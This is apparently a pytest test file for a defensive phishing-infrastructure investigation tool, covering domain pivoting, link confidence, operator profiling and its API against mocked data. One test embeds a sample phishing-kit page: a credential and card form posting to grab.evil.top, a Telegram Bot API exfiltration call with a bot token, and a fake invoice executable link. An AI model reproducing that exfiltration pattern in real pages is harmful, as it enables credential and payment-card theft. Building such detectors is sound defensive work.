"""
Infrastructure Investigator: pivoting, evidence-weighted linking, operator profile, predictions, API.

A synthetic phishing operation (all network calls mocked):

    login.gi-de.evil-root.tech   seed: password form -> collect.evilcdn.top, Telegram exfil bot 123456789, ns1.evilns.top
      |- crt.sh / passive DNS    secure.gi-de.evil-root.tech, giesecke-verify.evil-root.tech  (same registered domain)
      |- TLS certificate SAN     gi-de-portal.top                                             (same certificate)
      |- uncommon name server    gi-de-wallet.top  -> SAME Telegram bot + an ETH wallet       (same operator)
      |- dedicated IP (2 hosts)  coffee-blog.com                                              (only shares a small IP)
      '- mass-hosting IP (60)    gi-de-shop.net + 59 others                                   (shared hosting only)
"""

from __future__ import annotations

from unittest import mock

import pytest

from core import infra

SEED = "login.gi-de.evil-root.tech"
BOT = "bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"
IP_DEDICATED, IP_MASS = "203.0.113.10", "198.51.100.7"
MASS = ["gi-de-shop.net"] + [f"site{i}.example.org" for i in range(59)]

A = {
    SEED: [IP_DEDICATED, IP_MASS], "secure.gi-de.evil-root.tech": [IP_DEDICATED], "giesecke-verify.evil-root.tech": [IP_DEDICATED],
    "gi-de-portal.top": ["203.0.113.11"], "gi-de-wallet.top": ["203.0.113.12"], "coffee-blog.com": [IP_DEDICATED],
    "gi-de-shop.net": [IP_MASS], "gi-de-login.top": ["203.0.113.50"],
}
NS = {SEED: ["ns1.evilns.top"], "gi-de-wallet.top": ["ns1.evilns.top"], "coffee-blog.com": ["ns1.cloudflare.com"]}

PAGES = {
    SEED: {"title": "Giesecke+Devrient Login", "signals": {"password_form": True, "telegram_exfil": True},
           "artifacts": {"telegram_bots": ["123456789:AAHd…saw"], "exfil_hosts": ["collect.evilcdn.top"]}},
    "secure.gi-de.evil-root.tech": {"title": "Sign in", "signals": {"password_form": True}, "artifacts": {}},
    "gi-de-wallet.top": {"title": "Connect wallet", "signals": {"seed_phrase": True, "telegram_exfil": True},
                         "artifacts": {"telegram_bots": ["123456789:AAHd…saw"], "wallets": ["0x" + "ab" * 20]}},
    "coffee-blog.com": {"title": "Best coffee beans", "signals": {}, "artifacts": {}},
    "gi-de-portal.top": {"title": "Portal", "signals": {}, "artifacts": {}},
}


def fake_dns(hosts, **_):
    out = {}
    for h in hosts:
        a = A.get(h, [])
        out[h] = {"domain": h, "a": a, "aaaa": [], "mx": [], "ns": NS.get(h, []), "status": "resolves" if a else "nxdomain", "registered": bool(a)}
    return out


def fake_page(host, crawler, timeout=8, budget=14):
    p = PAGES.get(host)
    if not p:
        return None
    return {"status": 200, "final_url": f"https://{host}/", "final_host": host, "redirects": [], "server": "nginx", "generator": "",
            "forms": [], "favicon": None, "shingles": set(), **p}


def fake_rdap(root):
    created = {"evil-root.tech": "2026-11-20", "gi-de-wallet.top": "2026-11-22", "gi-de-portal.top": "2026-11-21", "coffee-blog.com": "2015-03-01"}
    return {"created": created.get(root, "2026-11-01") + "T00:00:00Z", "age_days": 5 if root != "coffee-blog.com" else 4000,
            "registrar": "NameSilo, LLC", "abuse_email": "abuse@namesilo.com", "registrant": {"redacted": True}}


def fake_cert(host, timeout=5):
    if host == SEED:
        return {"san": [SEED, "gi-de-portal.top"], "san_count": 2, "subject_cn": SEED, "issuer_org": "Let's Encrypt", "not_before": "2026-11-21"}
    return None


@pytest.fixture
def operation():
    patches = [
        mock.patch.object(infra, "resolve_domains", side_effect=fake_dns),
        mock.patch.object(infra, "fetch_page", side_effect=fake_page),
        mock.patch.object(infra, "registration_lookup", side_effect=fake_rdap),
        mock.patch.object(infra, "cert_info", side_effect=fake_cert),
        mock.patch.object(infra, "crtsh_search", return_value={"hosts": {
            "secure.gi-de.evil-root.tech": {"first_seen": "2026-11-21"}, "giesecke-verify.evil-root.tech": {"first_seen": "2026-11-22"}}, "error": None}),
        mock.patch.object(infra, "otx_passive_dns", return_value=[{"hostname": "secure.gi-de.evil-root.tech", "address": IP_DEDICATED, "record_type": "A", "first": "", "last": "2026-11-25"}]),
        mock.patch.object(infra, "hackertarget_reverse_ip", side_effect=lambda ip, limit=120: [SEED, "coffee-blog.com"] if ip == IP_DEDICATED else [SEED] + MASS),
        mock.patch.object(infra, "urlscan_search", return_value=[]),
        mock.patch.object(infra, "hackertarget_shared_dns", side_effect=lambda ns, limit=80: [SEED, "gi-de-wallet.top"] if ns == "ns1.evilns.top" else []),
        mock.patch.object(infra, "asn_lookup", side_effect=lambda ip: {"asn": "AS64500", "prefix": "203.0.113.0/24", "country": "NL", "as_name": "EXAMPLE-HOSTING"}),
        mock.patch.object(infra, "ip_abuse", return_value={"org": "Example Hosting BV", "abuse_email": "abuse@example-hosting.nl", "country": "NL"}),
    ]
    for p in patches:
        p.start()
    try:
        yield infra.investigate(SEED, depth=2, max_domains=30)
    finally:
        for p in patches:
            p.stop()


def by_domain(res):
    return {d["domain"]: d for d in res["domains"]}


def test_pivots_reach_every_part_of_the_operation(operation):
    d = by_domain(operation)
    for host in ("secure.gi-de.evil-root.tech", "giesecke-verify.evil-root.tech", "gi-de-portal.top", "gi-de-wallet.top", "coffee-blog.com", "gi-de-shop.net"):
        assert host in d, f"{host} not reached: {sorted(d)}"
    assert d[SEED]["link_confidence"] == "seed"


def test_confidence_follows_evidence_strength(operation):
    d = by_domain(operation)
    assert d["secure.gi-de.evil-root.tech"]["link_confidence"] == "high"      # same attacker-owned registered domain
    assert d["gi-de-portal.top"]["link_confidence"] == "high"                 # same TLS certificate
    assert d["gi-de-wallet.top"]["link_confidence"] == "high"                 # same Telegram exfil bot
    assert d["coffee-blog.com"]["link_confidence"] == "medium"                # only a small shared IP: related, not proven
    assert d["gi-de-shop.net"]["link_confidence"] == "low"                    # mass-hosting IP: never "the actor"
    assert "site7.example.org" not in d                                       # unrelated mass-hosting neighbours are not fingerprinted
    assert any("Telegram" in p for p in d["gi-de-wallet.top"]["link_path"])


def test_kit_secrets_are_masked(operation):
    text = str(operation)
    assert BOT.split(":")[1] not in text and "123456789:AAHd" in text


def test_operator_profile(operation):
    a = operation["actor"]
    intents = {i["intent"] for i in a["intent"]}
    assert {"credential_theft", "crypto_fraud"} <= intents
    assert a["targets"] and a["targets"][0]["value"] == "gi-de"
    assert "evil-root" not in {t["value"] for t in a["targets"]}              # the attacker's own root is not a target
    assert a["attribution"]["exfil_hosts"] == ["collect.evilcdn.top"]
    assert "0x" + "ab" * 20 in a["attribution"]["wallets"]
    assert "abuse@namesilo.com" in a["attribution"]["abuse_contacts"]
    assert {t["id"] for t in a["attack"]} >= {"T1583.001", "T1566.002", "T1567"}
    assert any("Telegram" in s for s in a["style"])
    assert a["confidence"] == "high" and 0 < a["sophistication"] <= 100
    assert a["timeline"] and a["timeline"][0]["date"] <= a["timeline"][-1]["date"]
    assert "coffee" not in " ".join(t["value"] for t in a["targets"])


def test_predictions_are_checked_live(operation):
    nxt = {p["domain"]: p for p in operation["actor"]["predictions"]["next_domains"]}
    assert nxt, "should predict next domains from the gi-de naming pattern"
    assert nxt["gi-de-login.top"]["state"] == "registered" and nxt["gi-de-login.top"]["resolves"]
    assert list(nxt)[0] == "gi-de-login.top"                                  # registered ones first
    assert all(p["state"] in ("registered", "available", "unknown") for p in nxt.values())
    assert "gi-de-wallet.top" not in nxt                                      # never "predict" what was already found


def test_graph_is_consistent(operation):
    ids = {n["id"] for n in operation["nodes"]}
    assert all(e["source"] in ids and e["target"] in ids for e in operation["edges"])
    assert all(e["strength"] in ("strong", "medium", "weak") and e["evidence"] for e in operation["edges"])
    types = {n["type"] for n in operation["nodes"]}
    assert {"domain", "ip", "ns", "asn", "telegram_bot", "exfil_host", "cert"} <= types
    csv = infra.ioc_csv(operation)
    assert "domain,gi-de-wallet.top,high" in csv and "gi-de-shop.net" not in csv


def test_intent_rules():
    def dom(signals=None, artifacts=None, page=True, status="resolves"):
        return {"page": {"signals": signals or {}, "artifacts": artifacts or {}} if page else None, "dns_status": status, "name_tokens": []}
    assert infra.classify_intent(dom({"card_form": True}))[0]["intent"] == "card_fraud"
    assert infra.classify_intent(dom({"downloads": True}, {"downloads": ["https://x/a/setup.exe"]}))[0]["intent"] == "malware"
    assert infra.classify_intent(dom({"support_scam": True}))[0]["intent"] == "support_scam"
    assert infra.classify_intent(dom(page=False))[0]["intent"] == "staged"
    assert infra.classify_intent(dom()) == []                                  # nothing seen: no claim


def test_fetch_page_extracts_kit_dna():
    html = f"""<html><head><title>DHL Delivery</title><link rel="icon" href="/f.ico"></head><body>
      <form action="https://grab.evil.top/p.php" method="post"><input name="user"><input type="password" name="pw">
      <input name="cardnumber"><input name="cvv"></form>
      <script>fetch("https://api.telegram.org/{BOT}/sendMessage?chat_id=-100223344556&text=x")</script>
      <script>gtag('config','G-ABCDEF1234'); fbq('init', '123456789012345');</script>
      <a href="https://t.me/darkops_support">help</a><a href="/files/DHL_Invoice.exe">invoice</a>
      <p>Pay with USDT TRC20 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</p></body></html>""".encode()
    resp = (200, "https://dhl-track.top/", {"content-type": "text/html"}, html, [])
    with mock.patch.object(infra, "_fetch", return_value=resp), mock.patch.object(infra, "_fetch_image", return_value=None):
        p = infra.fetch_page("dhl-track.top", crawler=mock.Mock())
    art, sig = p["artifacts"], p["signals"]
    assert p["title"] == "DHL Delivery"
    assert art["exfil_hosts"] == ["grab.evil.top"]
    assert art["telegram_bots"] == ["123456789:AAHd…saw"] and art["telegram_chats"] == ["-100223344556"]
    assert "G-ABCDEF1234" in art["analytics"] and "fb:123456789012345" in art["analytics"]
    assert art["telegram_handles"] == ["darkops_support"] and art["wallets"] == ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"]
    assert sig["password_form"] and sig["card_form"] and sig["downloads"] and sig["telegram_exfil"]


def test_asn_lookup_parses_team_cymru():
    class R:
        def __init__(self, txt):
            self.txt = txt

        def __str__(self):
            return self.txt

    answers = {"10.113.0.203.origin.asn.cymru.com": [R('"64500 | 203.0.113.0/24 | NL | ripencc | 2010-01-01"')],
               "AS64500.asn.cymru.com": [R('"64500 | NL | ripencc | 2010-01-01 | EXAMPLE-HOSTING, NL"')]}
    infra._ASN_CACHE.clear()
    fake = mock.Mock()
    fake.resolve.side_effect = lambda name, rtype: answers[name]
    with mock.patch("dns.resolver.Resolver", return_value=fake):
        out = infra.asn_lookup("203.0.113.10")
    assert out == {"asn": "AS64500", "prefix": "203.0.113.0/24", "country": "NL", "as_name": "EXAMPLE-HOSTING, NL"}


def test_api_job_flow(monkeypatch):
    pytest.importorskip("httpx")
    import time as _t

    from fastapi.testclient import TestClient

    import app as app_module
    from api.routes import investigate as inv_routes

    fake_result = {"seed": "x.evil.top", "domains": [{"domain": "x.evil.top", "link_confidence": "seed", "dns": {"a": ["1.2.3.4"]}, "artifacts": {}}],
                   "nodes": [], "edges": [], "actor": {}, "stats": {}}
    monkeypatch.setattr(inv_routes, "core_investigate", lambda target, **kw: dict(fake_result))
    c = TestClient(app_module.app)
    assert c.post("/api/investigate", json={"target": " "}).status_code == 400
    job = c.post("/api/investigate", json={"target": "x.evil.top"}).json()["job_id"]
    for _ in range(50):
        st = c.get(f"/api/investigate/{job}").json()
        if st["status"] != "running":
            break
        _t.sleep(0.05)
    assert st["status"] == "done" and st["result"]["seed"] == "x.evil.top"
    csv = c.get(f"/api/investigate/{job}/iocs.csv")
    assert csv.status_code == 200 and "domain,x.evil.top,seed" in csv.text
    assert c.get("/api/investigate/nope").status_code == 404


def test_each_pivot_runs_once_and_rate_limited_sources_are_skipped(operation):
    # the fixture's mocks are still recording: crt.sh asked once per root, reverse IP once per IP
    calls = infra.crtsh_search.call_args_list if hasattr(infra.crtsh_search, "call_args_list") else []
    roots = [c.args[0] for c in calls]
    assert len(roots) == len(set(roots)), roots


def test_circuit_breaker_and_legitimate_mode_with_clones():
    """A legitimate seed: own subdomains via its certificate, one copy of its title on someone else's domain."""
    seed = "brandco.com"
    otx_calls = []

    def dns(hosts, **_):
        return {h: {"domain": h, "a": ["192.0.2.1"] if h != "brandco-login.evil.top" else ["192.0.2.66"], "aaaa": [], "mx": [], "ns": [],
                    "status": "resolves", "registered": True} for h in hosts}

    def page(host, crawler, timeout=8, budget=14):
        title = "Brandco | Official Site"
        return {"status": 200, "final_url": f"https://{host}/", "final_host": host, "title": title, "signals": {}, "artifacts": {},
                "favicon": None, "shingles": set(), "forms": []}

    def otx(root, limit=150):
        otx_calls.append(root)
        raise infra.SourceError("HTTP 429: rate limited", kind="rate_limit")

    with mock.patch.object(infra, "resolve_domains", side_effect=dns), \
            mock.patch.object(infra, "fetch_page", side_effect=page), \
            mock.patch.object(infra, "registration_lookup", return_value={"created": "2009-01-01T00:00:00Z", "age_days": 6000, "registrar": "MarkMonitor"}), \
            mock.patch.object(infra, "cert_info", side_effect=lambda h, timeout=5: {"san": ["brandco.com", "shop.brandco.com"], "san_count": 2,
                                                                                    "subject_cn": "brandco.com", "issuer_org": "DigiCert", "not_before": "2026-01-01"} if h.endswith("brandco.com") else None), \
            mock.patch.object(infra, "crtsh_search", return_value={"hosts": {}, "error": None}), \
            mock.patch.object(infra, "otx_passive_dns", side_effect=otx), \
            mock.patch.object(infra, "hackertarget_reverse_ip", return_value=[]), \
            mock.patch.object(infra, "hackertarget_shared_dns", return_value=[]), \
            mock.patch.object(infra, "urlscan_search", side_effect=lambda q, size=100: [{"host": "brandco-login.evil.top"}] if q.startswith("page.title") else []), \
            mock.patch.object(infra, "asn_lookup", return_value=None), mock.patch.object(infra, "ip_abuse", return_value=None):
        res = infra.investigate(seed, depth=2, max_domains=10)
    a = res["actor"]
    assert a["mode"] == "legitimate" and "No malicious behaviour" in a["summary"]
    assert [c["domain"] for c in a["clones"]] == ["brandco-login.evil.top"]          # the copy on someone else's domain
    assert "shop.brandco.com" not in {c["domain"] for c in a["clones"]}           # own estate is not a clone
    assert len(otx_calls) == 1 and any("skipped for the rest" in e for e in res["errors"])


def test_login_pages_on_established_sites_are_not_credential_theft():
    page = {"signals": {"password_form": True}, "artifacts": {}}
    assert infra.classify_intent({"page": page, "rdap": {"age_days": 4000}, "dns_status": "resolves"}) == []
    fresh = infra.classify_intent({"page": page, "rdap": {"age_days": 6}, "dns_status": "resolves"})
    assert fresh[0]["intent"] == "credential_theft" and "6-day-old" in fresh[0]["evidence"]
    kit = infra.classify_intent({"page": {"signals": {"password_form": True}, "artifacts": {"exfil_hosts": ["grab.evil.top"]}},
                                 "rdap": {"age_days": 4000}, "dns_status": "resolves"})
    assert kit[0]["intent"] == "credential_theft" and "grab.evil.top" in kit[0]["evidence"]   # compromised old site with a kit


def test_challenge_pages_are_never_treated_as_content():
    html = b"<html><head><title>Attention Required! | Cloudflare</title></head><body><div id='cf-chl-widget'>x</div></body></html>"
    p = infra.analyze_html(html, "https://x.top/", 403, {"content-type": "text/html", "server": "cloudflare"})
    assert p["blocked"] == "Cloudflare bot protection" and p["title"] == "" and p["signals"] == {}
    ok = infra.analyze_html(b"<html><title>Welcome</title><body>hello</body></html>", "https://x.top/", 200, {"content-type": "text/html"})
    assert not ok.get("blocked") and ok["title"] == "Welcome"


def test_impersonator_behind_cloudflare_is_judged_from_the_urlscan_snapshot():
    """Mirrors the live case: gi-de.astrobale-core.tech hides behind a Cloudflare challenge; URLScan saw the real title."""
    seed = "gi-de.astrobale-core.tech"
    challenge = {"status": 403, "final_url": f"https://{seed}/", "final_host": seed, "title": "", "blocked": "Cloudflare bot protection",
                 "signals": {}, "artifacts": {}, "favicon": None, "shingles": set(), "forms": [], "redirects": [], "server": "cloudflare"}

    def dns(hosts, **_):
        return {h: {"domain": h, "a": ["104.21.45.61"], "aaaa": [], "mx": [], "ns": ["kim.ns.cloudflare.com"], "status": "resolves", "registered": True} for h in hosts}

    def page(host, crawler, timeout=8, budget=14):
        return dict(challenge, final_url=f"https://{host}/", final_host=host)

    snap_calls = []

    def snapshot(host):
        snap_calls.append(host)
        if host != seed:
            return None
        return {"status": None, "final_url": f"https://{seed}/", "final_host": seed, "title": "Giesecke+Devrient - SecurityTech", "redirects": [],
                "server": "", "forms": [], "artifacts": {}, "signals": {}, "favicon": None, "shingles": set(), "partial": True,
                "via": "urlscan", "observed": "2026-11-24", "scan_url": "https://urlscan.io/result/x/"}

    with mock.patch.object(infra, "resolve_domains", side_effect=dns), mock.patch.object(infra, "fetch_page", side_effect=page),             mock.patch.object(infra, "urlscan_snapshot", side_effect=snapshot),             mock.patch.object(infra, "registration_lookup", return_value={"created": "2026-05-15T00:00:00Z", "age_days": 195, "registrar": "OVH sas"}),             mock.patch.object(infra, "cert_info", side_effect=lambda h, timeout=5: {"san": [seed, "astrobale-core.tech"], "san_count": 2, "subject_cn": seed,
                                                                                    "issuer_org": "Google Trust Services", "not_before": "2026-11-21"}),             mock.patch.object(infra, "crtsh_search", return_value={"hosts": {}, "error": None}),             mock.patch.object(infra, "otx_passive_dns", return_value=[]), mock.patch.object(infra, "hackertarget_reverse_ip", return_value=[]),             mock.patch.object(infra, "hackertarget_shared_dns", return_value=[]),             mock.patch.object(infra, "urlscan_search", side_effect=lambda q, size=100: [{"host": "gi-de.com"}] if q.startswith("page.title") else []),             mock.patch.object(infra, "asn_lookup", return_value={"asn": "AS13335", "as_name": "CLOUDFLARENET", "country": "US", "prefix": ""}),             mock.patch.object(infra, "ip_abuse", return_value={"org": "Cloudflare, Inc.", "abuse_email": "abuse@cloudflare.com"}):
        res = infra.investigate(seed, depth=2, max_domains=10, keywords=["gi-de", "Giesecke", "Devrient", "Giesecke+Devrient"])
    a = res["actor"]
    d = {x["domain"]: x for x in res["domains"]}
    assert d[seed]["blocked"] == "Cloudflare bot protection" and d[seed]["page_via"] == "urlscan"
    assert a["mode"] == "malicious" and a["intent"][0]["intent"] == "impersonation"
    assert "Cloudflare bot protection" in a["summary"] and "Giesecke+Devrient - SecurityTech" in a["summary"]
    assert a["impersonated_originals"] == ["gi-de.com"]                       # the victim brand, not part of the operation
    assert "gi-de.com" not in d                                               # never investigated as the actor
    vals = [t["value"] for t in a["targets"]]
    assert vals[0] == "gi-de" and "astrobale-core" not in vals and "gide" not in vals and len(vals) == len(set(vals))
    assert d["astrobale-core.tech"]["link_confidence"] == "high"             # same certificate as the seed
